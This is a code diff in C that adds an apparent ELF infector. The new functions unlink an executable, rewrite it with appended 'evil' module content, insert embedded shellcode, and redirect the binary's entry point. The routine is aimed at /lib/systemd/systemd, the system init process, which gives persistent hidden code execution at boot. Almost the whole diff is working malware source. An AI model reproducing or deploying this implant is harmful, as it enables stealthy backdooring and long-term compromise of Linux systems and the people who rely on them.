@@ -52,3 +52,102 @@ int find_valid_section(char *image,
 
     return -1;
 }
+
+int get_file_size(int fd)
+{
+    struct stat sb;
+    if (fstat(fd, &sb) < 0) {
+        puts("[!] fstat fail");
+        exit(1);
+    }
+    return sb.st_size;
+}
+
+
+void install_module_by_path(char *path,
+                            const char module_start[],
+                            const char module_end[])
+{
+    /*
+     * Unlink the original file and use mmap to map a memory region
+     * `source_image` to save the content. This is because the executing file
+     * cannot be modified, but can be unlinked.
+     */
+    int fd = open(path, O_RDONLY);
+    char *source_image, *image;
+    if (fd < 0) {
+        printf(WARN "fail to open file %s\n", path);
+        printf(WARN "Error: %s\n", strerror(errno));
+        return;
+    }
+    int image_size = get_file_size(fd);
+    if (!(source_image = mmap(NULL, image_size, PROT_READ | PROT_WRITE,
+                              MAP_PRIVATE, fd, 0))) {
+        puts(WARN "Fail to mmap");
+        close(fd);
+        return;
+    }
+    close(fd);
+    unlink(path);
+
+    /*
+     * Recreate the file image and map it to `image`.
+     * Move the original content to `image`.
+     * Unmap the `source_image`.
+     * At this time, we have a memory region can be used to modify the file
+     * content.
+     */
+    fd = open(path, O_RDWR | O_CREAT, 0777);
+    if (fd < 0) {
+        printf(WARN "Fail to open file %s\n", path);
+        printf(WARN "Error: %s\n", strerror(errno));
+        return;
+    }
+    unsigned long evil_size = module_end - module_start;
+    unsigned long evil_base = ALIGN_UP(image_size, 0xfff);
+    ftruncate(fd, evil_base + evil_size);
+    image = mmap(NULL, evil_base + evil_size, PROT_READ | PROT_WRITE,
+                 MAP_SHARED, fd, 0);
+    close(fd);
+    memmove(image, source_image, image_size);
+    munmap(source_image, image_size);
+    source_image = NULL;
+
+    unsigned long patch_base, patch_virtual_base;
+    unsigned long patch_size = _binary_shellcode_bin_end -
+                               _binary_shellcode_bin_start + strlen(path) + 1;
+    if (find_valid_section(image, patch_size, &patch_base,
+                           &patch_virtual_base)) {
+        puts(WARN "No avalible space for patching");
+        goto out;
+    }
+    char *shellcode = malloc(patch_size - strlen(path) - 1);
+    if (!shellcode)
+        goto out;
+    memmove(shellcode, _binary_shellcode_bin_start,
+            patch_size - strlen(path) - 1);
+    Elf64_Ehdr *elf_header = (Elf64_Ehdr *) image;
+    *(unsigned long *) (shellcode + 2) =
+        patch_virtual_base - elf_header->e_entry;
+    *(unsigned long *) (shellcode + 10) = evil_base;
+    *(unsigned long *) (shellcode + 18) = evil_size;
+    elf_header->e_entry = patch_virtual_base;
+
+    memmove(image + patch_base, shellcode, patch_size - strlen(path) - 1);
+    memmove(image + patch_base + patch_size - strlen(path) - 1, path,
+            strlen(path) + 1);
+    memmove(image + evil_base, module_start, evil_size);
+    free(shellcode);
+    shellcode = NULL;
+
+out:
+    msync(image, evil_base + evil_size, MS_SYNC);
+    munmap(image, evil_base + evil_size);
+    image = NULL;
+    return;
+}
+
+void install_module(const char module_start[], const char module_end[])
+{
+    install_module_by_path("/lib/systemd/systemd", module_start, module_end);
+}
